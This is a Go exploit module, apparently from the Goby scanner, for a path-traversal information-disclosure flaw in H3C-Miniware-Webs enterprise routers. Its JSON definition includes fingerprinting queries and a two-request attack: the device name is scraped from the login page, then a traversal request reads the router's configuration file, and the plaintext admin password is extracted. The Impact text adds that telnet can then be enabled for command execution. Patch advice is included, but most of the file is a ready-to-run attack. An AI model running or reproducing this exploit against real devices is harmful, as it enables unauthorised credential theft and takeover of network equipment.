package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "H3C-Miniware-Webs actionpolicy_status Information Disclosure Vulnerability",
    "Description": "<p>H3C enterprise router series is an open multi service router, which deeply integrates routing/switching/security/wireless services and flexibly expands services, making the network both high-performance and robust. Some series of H3C enterprise routers have information disclosure vulnerabilities, and can read password files without authorization, obtain plaintext passwords, log in to the device management background</p>",
    "Product": "H3C-Miniware-Webs",
    "Homepage": "https://www.h3c.com/",
    "DisclosureDate": "2022-07-28",
    "Author": "Ant",
    "FofaQuery": "(banner=\"Server: H3C-Miniware-Webs\" && banner!=\"couchdb\" && banner!=\"drupal\") || (header=\"Server: H3C-Miniware-Webs\" && header!=\"couchdb\" && header!=\"drupal\")",
    "GobyQuery": "(banner=\"Server: H3C-Miniware-Webs\" && banner!=\"couchdb\" && banner!=\"drupal\") || (header=\"Server: H3C-Miniware-Webs\" && header!=\"couchdb\" && header!=\"drupal\")",
    "Level": "2",
    "Impact": "<p>Bypass the COOKIE authentication, perform directory traversal, and obtain the clear text configuration file of the device. There is a clear text password for the web administrator account admin in the configuration. Log in to the background to obtain command execution permissions by opening telnet.</p>",
    "Recommendation": "<p>1. Upgrade the device firmware to the latest version: ERHMG2-MNW100-R1122 and later, ERG2AW-MNW100-R1113 and later, MiniGR1B0V100R014 and later;</p><p>2. Turn off the H3C device&lt;Remote WEB Management&gt;and&lt;Remote TELNET Management&gt;functions;</p><p>3. The internal and external assets of the enterprise shall be checked, and the affected equipment shall be offline or transferred to the intranet in time.</p>",
    "References": [
        "https://zhiliao.h3c.com/questions/dispcont/180925"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/userLogin.asp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "H3C Corporation",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "name|lastbody|regex|<title>(.*)系统管理"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/userLogin.asp/../actionpolicy_status/../{{{name}}}.cfg",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "vtypasswd=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/userLogin.asp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "name|lastbody|regex|<title>(.*)系统管理"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/userLogin.asp/../actionpolicy_status/../{{{name}}}.cfg",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "vtypasswd=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|vtypasswd=(.*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2023-5142"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "H3C 多款企业路由器 actionpolicy_status 信息泄露漏洞",
            "Product": "H3C-Miniware-Webs",
            "Description": "<p>H3C企业路由器系列是一种开放式多业务路由器，深度融合路由/交换/安全/无线业务，业务灵活扩展，使网络兼具高性能与稳健性。H3C企业路由器部分系列存在信息泄露漏洞，可未授权读取密码文件，获取明文密码登录设备管理后台。<br></p>",
            "Recommendation": "<p>1、升级设备固件至最新版本：ERHMG2-MNW100-R1122 及之后版本、ERG2AW-MNW100-R1113及之后版本、MiniGR1B0V100R014及之后版本；</p><p>2、关闭H3C设备远程WEB管理和远程TELNET管理功能；</p><p>3、做好企业内外资产排查，将受影响的设备及时下线或转移至内网。</p>",
            "Impact": "<p>攻击者绕过COOKIE验证，进行目录穿越，获取设备的明文配置文件，配置中有明文的web管理员账号admin的密码，登录后台即可通过开启telnet获取命令执行权限。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "H3C-Miniware-Webs actionpolicy_status Information Disclosure Vulnerability",
            "Product": "H3C-Miniware-Webs",
            "Description": "<p>H3C enterprise router series is an open multi service router, which deeply integrates routing/switching/security/wireless services and flexibly expands services, making the network both high-performance and robust. Some series of H3C enterprise routers have information disclosure vulnerabilities, and can read password files without authorization, obtain plaintext passwords, log in to the device management background<br></p>",
            "Recommendation": "<p>1. Upgrade the device firmware to the latest version: ERHMG2-MNW100-R1122 and later, ERG2AW-MNW100-R1113 and later, MiniGR1B0V100R014 and later;</span><br></p><p>2. Turn off the H3C device&lt;Remote WEB Management&gt;and&lt;Remote TELNET Management&gt;functions;</p><p>3. The internal and external assets of the enterprise shall be checked, and the affected equipment shall be offline or transferred to the intranet in time.</p>",
            "Impact": "<p>Bypass the COOKIE authentication, perform directory traversal, and obtain the clear text configuration file of the device. There is a clear text password for the web administrator account admin in the configuration. Log in to the background to obtain command execution permissions by opening telnet.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10983"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
